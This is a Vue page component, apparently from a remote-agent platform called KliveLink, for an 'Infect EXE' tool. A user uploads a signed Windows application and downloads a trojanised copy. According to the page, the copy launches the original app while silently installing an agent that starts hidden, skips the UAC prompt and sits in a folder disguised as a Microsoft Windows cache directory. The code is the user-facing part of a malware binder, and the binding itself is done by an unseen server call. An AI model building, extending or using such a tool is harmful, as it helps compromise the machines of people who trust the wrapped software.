<template>
  <div class="ot-os kl-infect">
    <div class="ot-pagehead">
      <div>
        <h1><span class="code">INF</span>Infect EXE</h1>
        <p class="subtitle">Upload a signed application. The returned EXE runs the original app and installs KliveLink the first time it is opened.</p>
      </div>
      <div class="ot-actions"><NuxtLink to="/klivelink" class="ot-btn ghost">Fleet</NuxtLink></div>
    </div>

    <div v-if="!allowed" class="ot-banner bad" role="alert">
      <span class="glyph">⚠</span><div><strong>Missing permission</strong>klivelink.agents.infect is required.</div>
    </div>

    <div class="ot-grid two">
      <section class="ot-card">
        <header><div class="titles"><h2>Bind</h2><p class="subtitle">Original app stays usable</p></div></header>
        <div class="body">
          <label class="ot-field">
            <span class="lbl">Application EXE</span>
            <input ref="fileInput" class="ot-input" type="file" accept=".exe,application/vnd.microsoft.portable-executable" @change="onFile" />
          </label>
          <div v-if="file" class="file-line">
            <span class="mono">{{ file.name }}</span>
            <span class="muted">{{ formatBytes(file.size) }}</span>
          </div>
          <button class="ot-btn primary" :disabled="!file || busy || !allowed" @click="infect">
            {{ busy ? 'Binding…' : 'Infect and download' }}
          </button>
          <p class="muted small">
            The output is larger by the KliveLink agent. It installs per-user under
            <code>%LOCALAPPDATA%\Microsoft\Windows\Caches\kl</code> with no UAC prompt, starts hidden,
            and then launches the original application.
          </p>
        </div>
      </section>

      <section class="ot-card">
        <header><div class="titles"><h2>Result</h2><p class="subtitle">One clickable EXE</p></div></header>
        <div class="body">
          <div v-if="!result" class="muted">No file generated yet.</div>
          <div v-else class="result">
            <div class="ot-chip ok">Ready</div>
            <div class="mono">{{ result.name }}</div>
            <div class="muted">{{ formatBytes(result.size) }}</div>
            <a class="ot-btn primary" :href="result.url" :download="result.name">Download infected EXE</a>
          </div>
          <div v-if="error" class="ot-banner bad" style="margin-top: 12px"><span class="glyph">⚠</span><div>{{ error }}</div></div>
        </div>
      </section>
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, onBeforeUnmount, ref } from 'vue';
import { RequestPOSTFromKliveAPI } from '~/scripts/APIInterface';
import { useAccess } from '~/composables/useAccess';

definePageMeta({ layout: 'navbar' });
useHead({ title: 'KliveLink · Infect EXE' });

const access = useAccess();
const allowed = computed(() => access.can('klivelink.agents.infect'));
const fileInput = ref<HTMLInputElement | null>(null);
const file = ref<File | null>(null);
const busy = ref(false);
const error = ref('');
const result = ref<{ name: string; size: number; url: string } | null>(null);
let objectUrl: string | null = null;

function onFile(event: Event) {
  file.value = (event.target as HTMLInputElement).files?.[0] ?? null;
  result.value = null;
  error.value = '';
}

async function infect() {
  if (!file.value || busy.value) return;
  busy.value = true;
  error.value = '';
  try {
    const res = await RequestPOSTFromKliveAPI(
      `/klivelink/v2/infect?filename=${encodeURIComponent(file.value.name)}`,
      file.value,
      true,
      false,
    );
    if (!res.ok) {
      error.value = await res.text().catch(() => `HTTP ${res.status}`);
      return;
    }
    const blob = await res.blob();
    if (objectUrl) URL.revokeObjectURL(objectUrl);
    objectUrl = URL.createObjectURL(blob);
    result.value = {
      name: file.value.name.replace(/\.exe$/i, '') + '-infected.exe',
      size: blob.size,
      url: objectUrl,
    };
  } catch (e: any) {
    error.value = e?.message ?? 'Binding failed.';
  } finally {
    busy.value = false;
  }
}

function formatBytes(bytes: number) {
  if (bytes < 1024) return `${bytes} B`;
  if (bytes < 1024 * 1024) return `${(bytes / 1024).toFixed(1)} KB`;
  return `${(bytes / 1024 / 1024).toFixed(1)} MB`;
}

onBeforeUnmount(() => { if (objectUrl) URL.revokeObjectURL(objectUrl); });
</script>

<style scoped>
.kl-infect { padding: var(--ot-space-4) var(--ot-space-6) 64px; }
.ot-pagehead h1 { display: flex; gap: 10px; align-items: baseline; }
.ot-pagehead h1 .code { font-family: var(--ot-mono); font-size: 13px; color: var(--ot-accent); }
.ot-field { display: flex; flex-direction: column; gap: 6px; }
.ot-field .lbl { font-size: 11.5px; color: var(--ot-muted); text-transform: uppercase; letter-spacing: .7px; }
.file-line { display: flex; justify-content: space-between; gap: 12px; padding: 8px 0; font-size: 12px; }
.result { display: flex; flex-direction: column; gap: 10px; align-items: flex-start; }
.muted { color: var(--ot-muted); }
.small { font-size: 11.5px; line-height: 17px; }
code { font-family: var(--ot-mono); font-size: 11px; color: var(--ot-accent); }
.ot-btn.primary { width: 100%; justify-content: center; }
@media (max-width: 900px) { .kl-infect { padding: var(--ot-space-3) var(--ot-space-4) 48px; } }
</style>

